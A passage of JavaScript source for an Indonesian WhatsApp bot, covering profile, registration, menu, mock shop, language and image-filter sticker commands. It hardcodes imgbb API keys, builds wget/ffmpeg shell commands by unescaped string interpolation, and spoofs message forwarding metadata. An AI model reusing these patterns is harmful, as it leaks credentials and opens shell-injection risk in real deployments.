if (getBalance(sender,balance) <= total) return reply(`maaf Balance kamu belum mencukupi. silahkan kumpulkan dan beli nanti`)
kurangBalance(sender, total, balance)
givegame(sender, q, glimit)
reply(`Pembeliaan game limit sebanyak ${q} berhasil

*💳 Sisa Balance : $${getBalance(sender, balance)}*
*💷 Sisa Game Limit : ${cekGLimit(sender, gcount, glimit)} / ${gcount}*`)
}
break
	case 'me': case 'myinfo': case 'info': case 'profile': case 'profil':{
let cek = ms( await premium.getPremiumExpired(sender, premium) - Date.now())
let userProcfile = `「 *USER INFO* 」

📛 Nama : ${pushname}
💋 Bio : ${bio_user}
🔗 Tag : @${sender.split("@")[0]}
💥 Api : wa.me/${sender.split("@")[0]}

💹 Limit : ${isPremium ? 'Unlimited Premium' : `${getLimit(sender, limitawal, limit)} / ${limitawal}`}
💳 Game Limit : ${cekGLimit(sender, gcount, glimit)} / ${gcount}
💷 Balance : $${getBalance(sender, balance)}
👛 Dompet : ${checkATMuser(sender)}
💱 Role : ${role}
🏧 Level : ${getLevelingLevel(sender)}
🏦 Xp : ${getLevelingXp(sender)}

💌 Status : ${isPremium? `Premium User` : `Free user`}
⏰ Expired Prem : ${isPremium ? 'Unlimited Premium' : ` ${cek.days} d, ${cek.hours} h, ${cek.minutes} m, ${cek.seconds} s`}
👨‍🎓 Register : ${isRegister? `Done`:`Belum Daftar`}
🚫 Baned : ${isBanned?`True`:`False`}`
let papakpo = [{
										"buttonId": `inv`,
										"buttonText": {
											"displayText": "INVENTORY"
											},
										"type": "RESPONSE"
										},{
										"buttonId": `sewabot`,
										"buttonText": {
											"displayText": "SEWA"
											},
										"type": "RESPONSE"
										}]
								sendButLocation(from, userProcfile , `NOTE ！\nJika whatsapp mod kamu belum support button silahkan tanya owner\n\n${botname}™© | By ${ownername}`,pp_userz, papakpo, {contextInfo: { mentionedJid: [sender]}})
}
break
	case 'verify': case 'daftar':
 if (isRegister) return reply('Kan lu uda verify tadi')
 addRegisterUser(sender, pushname, bio_user, wib)
 let ran_blc = randomNomor(50)
 addBalance(sender, ran_blc, balance)
fs.writeFileSync('./database/user/register.json', JSON.stringify(register))
teks = `╭─❒ *Verification* ❒\n│📛 *Nama :* ${pushname}\n│#️⃣ *Nomor :* @${sender.split('@')[0]}\n│💌 *Bio :* ${bio_user}\n│⏰ *Time :* ${wib} Wib\n╰❒ *Success*`
let papako = [{
										"buttonId": `menu`,
										"buttonText": {
											"displayText": "MENU"
											},
										"type": "RESPONSE"
										},{
										"buttonId": `me`,
										"buttonText": {
											"displayText": "PROCFILE"
											},
										"type": "RESPONSE"
										}]
								sendButLocation(from, teks , `Thank for verification 💋\n${botname}™© | By ${ownername}`,pp_userz, papako, {contextInfo: { mentionedJid: [sender]}})
                break
	case 'menu': case 'help':
			try {
				chatt = await alpha.getProfilePicture(sender)
				} catch {
				chatt = 'https://telegra.ph/file/a2a93e1c26da975dadd2d.jpg'
				}
			let ch = await getBuffer(chatt)
koko = `${targetpc}@s.whatsapp.net`
let content = fs.readFileSync(`image/${thumbnail}`)
const media = await alpha.prepareMessage(from, content, MessageType.image, { thumbnail:fs.readFileSync(`image/${thumbnail}`)})
let bacotlu = media.message["ephemeralMessage"] ? media.message.ephemeralMessage : media
let p1 = await alpha.getStatus(sender)
anunya = process.uptime()
ini_anu =`${ucapannya2} @${sender.split('@')[0]}

			「 *BOT INFO* 」

*あ Creator :* _@${koko.split('@')[0]}_
*あ Powered  :* _@${ini_mark.split('@')[0]}_
*あ Mode :* _${banChats ? 'SELF-MODE' : 'PUBLIC-MODE'}_
*あ Status :* _${offline ? 'OFFLINE' : 'ONLINE'}_
*あ Prefix :*  _${prefix}_
*あ Group Chat :* _${giid.length}_
*あ Private Chat :* _${totalchat.length - giid.length}_
*あ Total Chat :* _${totalchat.length}_
*あ Lib  :* _Baileys_
*あ Type  :* _NodeJs_
*あ Total hit :* _${hitall}_
*あ Hit today :* _${hit_today.length}_
*あ Speed :* _${latensii.toFixed(4)} Second_
*あ Runtime :* _${kyun(anunya)}_
*あ Battery :* _${isBattre}_
*あ Charging :* _${isCharge}_

			「 *YOU INFO* 」

*あ Name :* _${pushname}_
*あ Bio :* _${p1 ? `${p1.status}` : '-'}_
*あ Nomor :* _@${sender.split('@')[0]}_
*あ Me :* _${mek.key.fromMe ? 'True' : 'False'}_
*あ Owner :* _${isOwner ? 'True' : `False`}_
*あ CoOwner :* _${isCreator ? 'True' : `False`}_
`
const buttons = [
  {buttonId: 'Command', buttonText: {displayText: 'Command'}, type: 1},
  {buttonId: 'ownerku', buttonText: {displayText:  Owner'}, type: 1},
  {buttonId: 'grup bot', buttonText: {displayText: ' Group Bot'}, type: 1}
]

const btn = {
    contentText: ini_anu ,
    footerText: `${tampilTanggal}${enter}${tampilWaktu}${enter}${enter}© ${creator}`,
    buttons: buttons,
    headerType: 4,
    imageMessage: bacotlu.message.imageMessage
}
if(menusimple == false){
sendMenuWithFakeYt(btn,ch,sender, koko, ini_mark)
} else if(menusimple = true){ 
let content1 = fs.readFileSync(`image/${thumbnail}`)
const media1 = await alpha.prepareMessage(from, content1, MessageType.location, {thumbnail: content1})
let bacotlu1 = media1.message["ephemeralMessage"] ? media1.message.ephemeralMessage : media1

const buttons1 = [
  {buttonId: 'ownerku', buttonText: {displayText: '⋮☰ OWNER'}, type: 1},
  {buttonId: 'statiktiknya', buttonText:{displayText: '✓ STATISTIC'}, type: 1},
  {buttonId: 'Command', buttonText: {displayText: '❍ LIST MESSAGE'}, type: 1}
]

const btn1 = {
    contentText: allmenu(prefix, wita, wit, ucapannya2, timuu, status, wa_version, mcc, mnc, os_version, device_manufacturer, device_model, alfa , alfa1, thisDay, ini_tanggal, totalchat, hit_today, ini_gcchat),
    footerText: `${tampilTanggal}${enter}${tampilWaktu}${enter}${enter}Regard @${koko.split('@')[0]}`,
    buttons: buttons1,
    headerType: 6,
    locationMessage: bacotlu1.message.locationMessage
}

alpha.sendMessage(from,  btn1, MessageType.buttonsMessage,{
        caption: 'Botwea ©2k21',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
            "mentionedJid" : [sender,koko,ini_mark],
            },
			quoted: fkontak,sendEphemeral: true 
			})
}

break
case 'shop':
koko = `62887435047326@s.whatsapp.net`
			let content1 = fs.readFileSync(`image/${thumbnail}`)
const media1 = await alpha.prepareMessage(from, content1, MessageType.location, {thumbnail: fs.readFileSync(`image/${thumbnail}`)})
let bacotlu1 = media1.message["ephemeralMessage"] ? media1.message.ephemeralMessage : media1

const buttons1 = [
  {buttonId: 'diamond_ff', buttonText: {displayText: 'DIAMOND FF'}, type: 1},
  {buttonId: 'diamond_ml', buttonText: {displayText: 'DIAMOND ML'}, type: 1},
  {buttonId: 'uc_pubg', buttonText:{displayText: 'UC PUBG'}, type: 1}
]

const btn1 = {
    contentText: `Halo @${sender.split('@')[0]}\n\nTop up diamond by WhatsApp bot. Ini hanyalah percobaan jadi zeeone gak jual diamond, uc, dll. Untuk list shop yang lain ketik ${prefix}price😅🤙`,
    footerText: `${tampilTanggal}\n${tampilWaktu}\n${creator}\n\nRegard @${koko.split('@')[0]}`,
    buttons: buttons1,
    headerType: 6,
    locationMessage: bacotlu1.message.locationMessage
}

alpha.sendMessage(from,  btn1, MessageType.buttonsMessage,{
        caption: 'Botwea ©2k21',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
            "mentionedJid" : [sender,koko],
            },
			quoted: fkontak,sendEphemeral: true 
			})
break
 case 'setmenu':
if (!isOwner && !isCreator && !mek.key.fromMe) return reply(lang.onlyOwner())
if (args.length < 1) return reply(`*Example :*${enter} •${prefix + command} simple\n  for simple menu\n${enter} •${prefix + command} ori\n  for real menu`)
 if ((args[0]) == 'ori'){
menusimple = false
reply(`_Succses mengganti menu ke menu ori_`)
} else if((args[0]) == 'simple'){
menusimple = true
Mloc = false
reply(`_Succses mengganti menu ke menu simple_`)
} else {
reply(`*Example :*${enter} •${prefix + command} simple\n  for simple menu\n${enter} •${prefix + command} ori\n  for real menu`)
}
break
case 'setlang':
         if (!isOwner && !isCreator && !mek.key.fromMe) return reply(lang.onlyOwner())
if(args[0] == 'ind'){
lang = ind
reply('Sukses mengubah bahasa ke ind')
}else if(args[0] == 'eng'){
lang = eng
reply('Success changing language to eng')
}else if(args[0] == 'es'){
lang = es
reply('Éxito cambiando el idioma a es')
}else if(args[0] == 'ml'){
lang = ml
reply('ഭാഷയിലേക്ക് മാറ്റുന്നതിൽ വിജയം ml')
}else if(args[0] == 'pt'){
lang = pt
reply('Sucesso ao alterar o idioma para pt')
}else if(args[0] == 'ru'){
lang = ru
reply('Успешно сменил язык на ru')
}else {
reply(`Example : ${prefix + command} eng\n\nAvailable\n•ind - Indonesia\n•eng - English\n•es - Spanish\n•ml - Malayalam\n•pt - Portugis\n•ru - Russian`)
}
break
                case 'allmenu':
                let papao = [{
										"buttonId": `owner`,
										"buttonText": {
											"displayText": "OWNER"
											},
										"type": "RESPONSE"
										},{
										"buttonId": `sewabot`,
										"buttonText": {
											"displayText": "SEWA"
											},
										"type": "RESPONSE"
										},{
										"buttonId": 'Command',
										"buttonText": {
											"displayText": "LIST MESSAGE"
											},
										"type": "RESPONSE"
										}]
								sendButLocation(from, allmenu(prefix, wita, wit, ucapannya2 , timuu, status, wa_version, mcc, mnc, os_version, device_manufacturer, device_model, alfa , alfa1, thisDay, ini_tanggal, totalchat, hit_today, ini_gcchat), `NOTE ！\nJika whatsapp mod kamu belum support button silahkan tonton video ini https://youtu.be/ERGID4Fmo9w\n\n${botname}™© | By ${ownername}`,pp_userz, papao, {})
                break
        case 'trigger':
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/triggered?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
					case 'sampah':
					var imgbb = require('imgbb-uploader')
	                 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	                 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	                 
	                 owgi = await alpha.downloadAndSaveMediaMessage(ger)
	                 let aanu = await imgbb("55e7971b786836b9966eca4528210ba8", owgi)
	                let teks = `${aanu.display_url}`
                    titid = await fetchJson(`https://nekobot.xyz/api/imagegen?type=trash&url=${teks}`, {method: 'get'})
                    buffer = await getBuffer(titid.message)
					alpha.sendMessage(from, buffer, image, {caption : lang.success(),quoted: mek})
                   }
              break       
				
		case 'gay':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/gay?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
		case 'glass':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/glass?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
		case 'passed':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/passed?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
		case 'jail':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/jail?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
		case 'comrade':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/comrade?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
		case 'hijau':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu6 = `https://some-random-api.ml/canvas/green?avatar=${teks}`
					exec(`wget ${anu6} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					
					})
					} else {
					reply('Gunakan foto!')
					}
					break 
		case 'biru':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu7 = `https://some-random-api.ml/canvas/blue?avatar=${teks}`
					exec(`wget ${anu7} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
					 break 
		case 'greyscale':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/greyscale?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break 
		case 'invert':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/invert?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break 
		case 'invert_greyscale':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/invertgreyscale?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break 
		case 'red':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/red?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break
         case 'blurple':
         
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/blurple?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break 
		case 'blurple2':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/blurple2?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break 
		case 'wasted':
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu2 = `https://some-random-api.ml/canvas/wasted?avatar=${teks}`
					exec(`wget ${anu2} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
					break 
		case 'pelangi':
		case 'rainbow':
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu3 = `https://some-random-api.ml/canvas/gay?avatar=${teks}`
					exec(`wget ${anu3} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
					break 
		case 'sepia':
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu4 = `https://some-random-api.ml/canvas/sepia?avatar=${teks}`
					exec(`wget ${anu4} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
					break 
					case 'jadian':
jds = []
jdii = groupMembers
koss = groupMembers
akuu = jdii[Math.floor(Math.random() * jdii.length)]
diaa = koss[Math.floor(Math.random() * koss.length)]
teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]}  (♥️ ) @${diaa.jid.split('@')[0]} `
jds.push(akuu.jid)
jds.push(diaa.jid)
mentions(teks, jds, true)
break
   case 'group': 
   case 'gc': 
                if (!isGroup) return reply(lang.onlygc());
        if (!isGroupAdmins && !isBotGroupAdmins) return reply(lang.onlygcAdmin());
